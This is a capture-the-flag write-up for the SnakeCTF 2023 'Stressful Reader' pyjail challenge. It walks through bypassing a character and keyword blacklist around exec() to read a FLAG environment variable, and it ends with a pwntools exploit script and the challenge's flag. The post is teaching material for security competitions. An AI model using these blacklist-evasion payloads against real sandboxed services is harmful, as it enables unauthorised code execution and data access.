---
date: '2023-12-12T12:00:00Z'
draft: false
title: 'SnakeCTF23 - Stressful Reader'
summary: "Pyjail challenge from SnakeCTF 2023."

categories: writeups
tags: 
    - "misc"
    - "pyjail"
author: "bhackari"
---

## Challenge description:

>I want to read an env variable, but I'm getting stressed out because of that  
>blacklist!!! Would you help me plz? :(  
>
>`nc misc.snakectf.org 1700`

The file attached to the challenge is called `jail.py`, so we deduce that this is a pyjail challenge, meaning that we have to find a way to exit a python sandbox and find the flag in the host file system.

---

## Source code:

`Jail.py` implements a python class called “Jail”, this class  implements 3 methods:  
1. `__init__`: this will initialize 4 attributes with empty strings (`F`, `L`, `A` and `G`,) and then call the `run_code` method with our input as a parameter.
2. `run_code`: this is the function where all the magic happens: our input has to pass a blacklist-based filter to then be executed by an `exec` function, our goal is to create a payload that can pass the blacklist filter and print the flag using python code. Note that any attempt to use blacklisted strings or chars will result in an error message and the code not beeing executed.
3. `get_var`: this functions takes a string as a parameter and prints the env variable with that name.

```python
#!/usr/bin/env python3
import os

banner = r"""
 _____ _                      __       _                       _
/  ___| |                    / _|     | |                     | |
\ `--.| |_ _ __ ___  ___ ___| |_ _   _| |   _ __ ___  __ _  __| | ___ _ __
 `--. \ __| '__/ _ \/ __/ __|  _| | | | |  | '__/ _ \/ _` |/ _` |/ _ \ '__|
/\__/ / |_| | |  __/\__ \__ \ | | |_| | |  | | |  __/ (_| | (_| |  __/ |
\____/ \__|_|  \___||___/___/_|  \__,_|_|  |_|  \___|\__,_|\__,_|\___|_|

"""

class Jail():
    def __init__(self) -> None:
        print(banner)
        print()
        print()
        print("Will you be able to read the $FLAG?")
        print("> ",end="")

        self.F = ""
        self.L = ""
        self.A = ""
        self.G = ""
        self.run_code(input())
        pass

    def run_code(self, code):
        badchars = [ 'c', 'h', 'j', 'k', 'n', 'o', 'p', 'q', 'u', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '!', '"', '#', '$', '%', '&', '\'', '-', '/', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '`', '{', '|', '}', '~', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

        badwords = ["aiter", "any", "ascii", "bin", "bool", "breakpoint", "callable", "chr", "classmethod", "compile", "dict", "enumerate", "eval", "exec", "filter", "getattr", "globals", "input", "iter", "next", "locals", "memoryview", "next", "object", "open", "print", "setattr", "staticmethod", "vars", "__import__", "bytes", "keys", "str", "join", "__dict__", "__dir__", "__getstate__", "upper"]

        if (code.isascii() and 
            all([x not in code for x in badchars]) and 
            all([x not in code for x in badwords])):
            exec(code)
        else:
            print("Exploiting detected, plz halp :/")

    def get_var(self, varname):
        print(os.getenv(varname))

if (__name__ == "__main__"):
    Jail()

```

---

## Solution:

Obviously the attributes `F`, `L`, `A` and `G` are not there only because they are nice, but there must be a way to use those variable names as chars, considering also that these are blacklisted characters. 

>So our final goal must be to call the `get_var` function passing "FLAG" as a parameter, using the attributes called `F`, `L`, `A`, `G`.

The first step we took was to create a python script to iterate throught the various printable chars and print only the ones allowed by the blacklist:

```python
import string

badchars = [ 'c', 'h', 'j', 'k', 'n', 'o', 'p', 'q', 'u', 'w', 'x', 'y', 'z'
            , 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N'
            , 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W'
            , 'X', 'Y', 'Z', '!', '"', '#', '$', '%'
            , '&', '\'', '-', '/', ';', '<', '=', '>', '?', '@'
            , '[', '\\', ']', '^', '`', '{', '|', '}', '~'
            , '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

allowed = []

for i in string.printable:
    if i not in badchars:
        allowed.append(i)

print(allowed)
```

and the result was:

```python
['a', 'b', 'd', 'e', 'f', 'g', 'i', 'l', 'm', 'r', 's', 't', 'v', '(', ')', '*', '+', ',', '.', ':', '_', ' ', '\t', '\n', '\r', '\x0b', '\x0c']
```

We can see that with those chars we can compose different python keywords like `self` and `get_var`, which might be useful to print the flag. The only thing that we have to craft is the string “FLAG”, mainly because we are not  allowed to use those letters (obviously) and we can't use chars such as the backtick and the double qoutes.

>**How can we access the attributes inside `__init__` and use their names as strings?

There is a python function called `dir` that lists all the methods, attributes and built-ins of an object. We can see that `__dir__` is blacklisted, while `dir` is not , this is a good starting point.  

>**Now, what object do we pass to this function? 

Easy, we pass `self` as a parameter, which is a keyword that is used to indicate the object itself inside the class.

From now on, to debug the payload, we executed the pyjail locally with a small change inside it: we removed the string “print” from the blacklist (and the characters of which the string “print” is composed), this was obviously done for debugging purpuses. 
So now let’s try locally our payload:  

```python
print(dir(self))
```  

the result was:  

```python
['A', 'F', 'G', 'L', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__',  
'__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__',  
'__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__',  
'__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__',  
'__subclasshook__', '__weakref__', 'get_var', 'run_code']  
```

That’s exactly what we wanted: it returns a list containing the names of every built-ins, methods and attributes of the object, including also the strings `A`, `F`, `G`  and `L`.  

Now, thought, we have another problem:  
>**how do we access these elements without using "bad characters"?  

Let's take a deeper look throught the built-ins methods by running:

```python
print(dir(dir(self))  
```

the result was:  

```python 
['__add__', '__class__', '__class_getitem__', '__contains__', '__delattr__',  
'__delitem__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__',  
'__getattribute__', '__getitem__', '__gt__', '__hash__', '__iadd__', '__imul__',  
'__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mul__',  
'__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__',  
'__rmul__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__',  
'append', 'clear', 'copy', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse',  
'sort']  
```

The `__getitem__` method might be interesting for us, because it takes an index as a parameter and returns the element that is at that index inside of a list.  
That’s perfect, but now we have another problem: we are not able to use numeric characters inside of our payload, so how can we solve this problem?  

We must first find a way to produce integer values as output, we may use a function that returns an integer and then use `+` or `*` to calculate the right index.  
But we liked to think about it in an easier way: we know that conditional expressions return `True` or `False`, in short: 1 or 0, so we could sum the result of conditional expression in order to create the right index.

But, again, we have something that blocks us: `>`, `<` and `=` are blacklisted, but these operators are not the only available, we can still use the `is` keyword (it checks if 2 objects are the same object).

To create 1s and 0s we decided to use these expressions:  
- `self is self` -> True -> 1  
- `self is dir(self)` -> False -> 0  

**Now we have everything we need to write our payload and obtain the flag.  

We can divide the payload in 4 parts, each part will return a character we need to compose the string "FLAG":  
- ‘F’ is at index 1: `dir(self).__getitem__(self is self)` 
- ‘L’ is at index 3: `dir(self).__getitem__((self is self)+(self is self)+(self is self))`
- ‘A’ is at index 0: `dir(self).__getitem__(self is dir(self))`  
- ‘G’ is at index 2: `dir(self).__getitem__((self is self)+(self is self))`

Now we can concatenate these chars to create our final payload:

```python
self.get_var(dir(self).__getitem__(self is self) + 
			 dir(self).__getitem__((self is self) +	(self is self) + (self is self)) + 
			 dir(self).__getitem__(self is dir(self)) + 
			 dir(self).__getitem__((self is self) + (self is self)))
```

---

## Final Exploit:

```python
from pwn import *

r = remote("misc.snakectf.org", 1700)

F = "dir(self).__getitem__(self is self)"
L = "dir(self).__getitem__((self is self) + (self is self) + (self is self))"
A = "dir(self).__getitem__(self is dir(self))"
G = "dir(self).__getitem__((self is self) + (self is self))"

payload = f"self.get_var({F}+{L}+{A}+{G})".encode()
r.sendlineafter(b"> ", payload)
print(r.recvline().strip())

r.close()
```

---

## Flag:

#### `snakeCTF{7h3_574r_d1d_7h3_j0b}`
